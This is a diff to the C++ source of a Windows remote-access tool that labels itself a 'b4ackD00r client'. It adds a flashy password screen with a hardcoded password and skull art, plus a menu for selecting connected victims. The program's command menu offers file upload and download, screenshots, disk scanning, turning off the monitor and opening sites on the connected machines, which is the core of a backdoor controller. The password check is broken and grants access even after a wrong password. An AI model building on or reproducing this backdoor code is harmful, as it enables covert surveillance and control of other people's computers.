@@ -2,6 +2,8 @@
 //Tastks:: Optimize
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #define _CRT_SECURE_NO_WARNINGS
+
+#pragma comment(lib, "winmm.lib")
 #pragma comment(lib,"Ws2_32.lib")
 #include <WinSock2.h>
 #include <iostream>
@@ -38,7 +40,55 @@ void concheck(SOCKET Connect1, SOCKET Listen1, HOSTENT *hst, sockaddr_in client_
 	}
 }
 
+void start() {
+	std::string pass;
+	std::string greetings = "Hello, user, enter password:\n";
+	for (int i = 0; i < greetings.size(); i++) {
+		std::cout << greetings[i];
+		if (i % 2 == 0)Sleep(250);
+		else Sleep(100);
+	}
+	std::getline(std::cin, pass);
+	HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
+	if (pass != "we live in a cruel world") { SetConsoleTextAttribute(handle, FOREGROUND_RED); std::cout << "Nice try.\n"; Sleep(5000);};
+	SetConsoleTextAttribute(handle, FOREGROUND_GREEN);
+	std::string scull[] = {
+		"            aad8888888baa                            ",
+		"         d:?88888888888?::8b                         ",
+		"      d8888:888888888??a888888b                      ",
+		"    d8888888a8888888aa8888888888b                    ",
+		"   dP        88888888888        Yb",
+		"  dP        @Y888888888P        @Yb                        ",
+		" d8           Y8888888P           8b                     ",
+		" 88            Y88888P            8b                   ",
+		" Y8baaaaaaaaaa88P T Y88aaaaaaaaaad8P                  ",
+		"   Y88888888888P  |  Y88888888888P                    ",
+		"            888   |   888                             ",
+		"            8888888888888b                          ",
+		"            88888888888888",
+		"           d88888888888888                                      ",
+		"           88  88  88   88                                      ",
+		"           88  88  88   88                                     ",
+		"           88  88  P    88                                    ",
+		"           88  88       88                              hj   ",
+	};
+	Sleep(3000);
+	std::cout << "Access granted\n";
+	Sleep(1000);
+	SetConsoleTextAttribute(handle, FOREGROUND_RED);
+	std::cout << std::endl << "           b4ackD00r client v2.3\n\n";
+	Sleep(1000);
+	mciSendString("play C:\\Users\\Explo\\source\\repos\\Client\\12.mp3", NULL, 0, NULL);
+	for (int i = 0; i < sizeof(scull)/sizeof(*scull); i++) {
+		std::cout << "   " << scull[i] << std::endl;
+		Sleep(480);
+	}
+
+	SetConsoleTextAttribute(handle, 0x7);
+}
+
 int main() {
+	//start();
 	setlocale(LC_ALL, "russian");
 	SetConsoleCP(1251);
 	SetConsoleOutputCP(1251);
@@ -70,7 +120,7 @@ int main() {
 
 	freeaddrinfo(result);
 
-	printf("Starting server...");
+	printf("\nStarting server...");
 	sockaddr_in client_addr;
 
 	int client_addr_size = sizeof(client_addr);
@@ -91,6 +141,13 @@ int main() {
 		while (true) {
 			char m_connect[256] = "";
 			int i = 0;
+			std::cout << "Select one of the connected users\n";
+			for (int i = 1; i <= ClientCount; i++) {
+				std::cout << "[" << i <<"]" << std::endl;
+			}
+			std::cin >> ClientCount;
+			std::cin.clear();
+			std::cin.ignore();
 			std::cout << "Enter the command:  \n-- s send the file \n--m display the message \n--o turn off the monitor \n--e close the client \n--w open the site \n--c take a screenshot\n--d download file\n dir scan disk\n";
 			char a = getchar();
 			while (a != '\n') {
